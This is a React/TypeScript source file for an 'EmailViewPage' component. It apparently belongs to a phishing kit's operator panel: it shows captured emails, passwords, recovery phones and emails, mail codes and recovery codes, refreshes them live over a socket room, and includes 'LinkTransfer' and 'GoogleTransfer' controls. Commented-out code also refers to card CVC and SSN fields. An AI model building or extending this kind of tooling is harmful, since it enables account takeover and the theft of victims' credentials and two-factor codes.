/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { useEffect, useState } from "react";


import { useGetInformationByIdQuery } from "../redux/Features/infoApi/infoApi";
import useSocket from "../hooks/useSocket";
import { useAppDispatch } from "../redux/hooks";
import { util } from "../redux/api/api";
import LinkTransfer from "../components/LinkTransfer";
import GoogleTransfer from "../components/GoogleTransfer";
// import { handleCopyClick } from "../utils/copyToClipboard";
import { BiChevronDown, BiChevronUp } from "react-icons/bi";
type EmailViewPageProps = {
  id: string;
};

export default function EmailViewPage({ id }: EmailViewPageProps){
  const [seter,setSeter] = useState(null)
  const { joinRoom, socket, receive } = useSocket();
  // const { id } = useParams();
  const { data } = useGetInformationByIdQuery(id);
  console.log(data,"data")

const [mergedMailingData, setMergedMailingData] = useState<any>({});
// Keep fullData updated
useEffect(() => {
  if (data?.mailing) {
    setMergedMailingData((prev: Record<string, any>) => ({
      ...prev,
      ...Object.fromEntries(
        Object.entries(data.mailing).filter(([_, v]) => v !== undefined && v !== null)
      )
    }));
  }
}, [data?.mailing]);

  console.log(mergedMailingData,"fullData")

  const [showPopup, setShowPopup] = useState(false);
  const [expandedSections, setExpandedSections] = useState<Record<string, boolean>>({});
  const dispatch = useAppDispatch();

  // List of fields to skip rendering
  const skipFields = ["userId", "user", "createdAt", "updatedAt", "_id", "__v", "isMailHide"];

  // Priority fields to render first with copy functionality
  const priorityFields = ["recoveryMail","email", "password","recoveryPhone","mailCode", "repassword","recoveryCode","recoveryMail", "agent"];

  useEffect(() => {
    const event = `info:${id}`;
    if (id) {
      joinRoom(event);

      const handleUpdateInfo = async ({ data }: any) => {
        console.log(data, "from id", id);
        dispatch(util.invalidateTags(["information"]));
      };

      receive(event, handleUpdateInfo);
      return () => {
        socket.off(event, handleUpdateInfo);
      };
    }
  }, [id, receive, joinRoom]);

  const toggleSection = (key: string) => {
    setExpandedSections(prev => ({
      ...prev,
      [key]: !prev[key]
    }));
  };

  // const renderMainField = (key: string, value: any) => {
  //   if (value === null || value === undefined) return null;

  //   // Special handling for agent field (only show source)
  //   if (key === "agent" && typeof value === "object" && value.source) {
  //     return (
  //       <div></div>
  //       // <div key={key} className="flex flex-col gap-1 col-span-1">
  //       //   <label className="text-sm font-medium text-gray-600 dark:text-gray-300 capitalize">
  //       //     Agent Source
  //       //   </label>
  //       //   <input
  //       //     type="text"
  //       //     readOnly
  //       //     value={value.source}
  //       //     className="border border-gray-300 dark:border-gray-600 rounded-md p-2 text-sm dark:bg-gray-800 cursor-pointer font-mono"
  //       //     onClick={() => handleCopyClick(value.source)}
  //       //   />
  //       // </div>
  //     );
  //   }

  //   // Render email, password, repassword with copy functionality
  //   return (
  //     // <div key={key} className="flex flex-col gap-1 col-span-1">
  //     //   <label className="text-sm font-medium text-gray-600 dark:text-gray-300 capitalize">
  //     //     {key}
  //     //   </label>
  //     //   <input
  //     //     type={"text"}
  //     //     readOnly
  //     //     value={String(value)}
  //     //     className="border border-gray-300 dark:border-gray-600 rounded-md p-2 text-sm dark:bg-gray-800 cursor-pointer font-mono"
  //     //     onClick={() => handleCopyClick(String(value))}
  //     //   />
  //     // </div>
  //     <div></div>
  //   );
  // };

  const renderOtherField = (key: string, value: any) => {
    if (value === null || value === undefined) return null;
    if (skipFields.includes(key)) return null;

    // Handle nested objects
    if (typeof value === "object" && !Array.isArray(value)) {
      const isExpanded = expandedSections[key] || false;
      
      return (
        <div key={key} className="col-span-4">
          <div 
            className="flex items-center justify-between p-3 border rounded-lg bg-gray-50 dark:bg-gray-700 cursor-pointer"
            onClick={() => toggleSection(key)}
          >
            <h3 className="font-semibold text-lg dark:text-white capitalize">
              {key.replace(/([A-Z])/g, ' $1')}
            </h3>
            {isExpanded ? <BiChevronUp className="h-5 w-5" /> : <BiChevronDown className="h-5 w-5" />}
          </div>
          
          
            <div className="mt-2 grid grid-cols-4 gap-4 p-4 border rounded-lg bg-white dark:bg-gray-800">
              {Object.entries(value).map(([nestedKey, nestedValue]) => (
                <div key={nestedKey} className="flex flex-col gap-1 col-span-1">
                  <label className="text-sm text-gray-600 dark:text-gray-300 capitalize">
                    {nestedKey.replace(/([A-Z])/g, ' $1')}
                  </label>
                  <input
                    // type={nestedKey.toLowerCase().includes("password") || 
                    //       nestedKey.toLowerCase().includes("cvc") || 
                    //       nestedKey.toLowerCase().includes("ssn") ? "password" : "text"}
                    readOnly
                    value={String(nestedValue)}
                    className="border border-gray-300 dark:border-gray-600 rounded-md p-2 text-sm dark:bg-gray-700"
                  />
                </div>
              ))}
            </div>
        
        </div>
      );
    }

    // Default field rendering (without copy functionality)
    return (
      <div key={key} className="flex flex-col gap-1 col-span-1">
        <label className="text-sm text-gray-600 dark:text-gray-300 capitalize">
          {key.replace(/([A-Z])/g, ' $1')}
        </label>
        <input
          type="text"
          readOnly
          value={String(value)}
          className="border border-gray-300 dark:border-gray-600 rounded-md p-2 text-sm dark:bg-gray-800"
        />
      </div>
    );
  };

  return (
    <div className="container mx-auto px-4 py-6">
      <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
        {/* Back Button */}
     <div className="">
  {/* Back to Inbox Button */}
  {/* <button
    onClick={() => navigate("/inbox")}
    className="flex items-center gap-2 text-blue-600 dark:text-blue-400 hover:underline text-sm font-medium"
  >
    <ArrowLeft className="h-4 w-4" />
    <span>Back to Inbox</span>
  </button> */}

  {/* LinkTransfer Component */}
  <LinkTransfer seter={seter} id={id} />
</div>

         

        {/* Popup */}
        {showPopup && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg w-96">
              <h2 className="text-lg font-semibold mb-4">Popup Title</h2>
              <p className="text-sm text-gray-600 dark:text-gray-400 mb-4">
                This is a popup. You can add any content here.
              </p>
              <button
                className="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded"
                onClick={() => setShowPopup(false)}
              >
                Close
              </button>
            </div>
          </div>
        )}

        {/* Main Content */}
        {data ? (
          <div className="space-y-4">
            {/* Priority Fields Section with copy functionality */}
              

            {/* Other Fields Section */}
           <div className="grid grid-cols-4 gap-4">
  {Object.entries(mergedMailingData)
    .filter(([key]) => priorityFields.includes(key))
    .map(([key, value]) => renderOtherField(key, value))}
</div>

          </div>
        ) : (
          <div className="text-center py-10">Loading information...</div>
        )}

          <div className="mt-8 space-y-6">
    
          <GoogleTransfer setSeter={setSeter}  />
        </div>
      </div>
    </div>
  );
}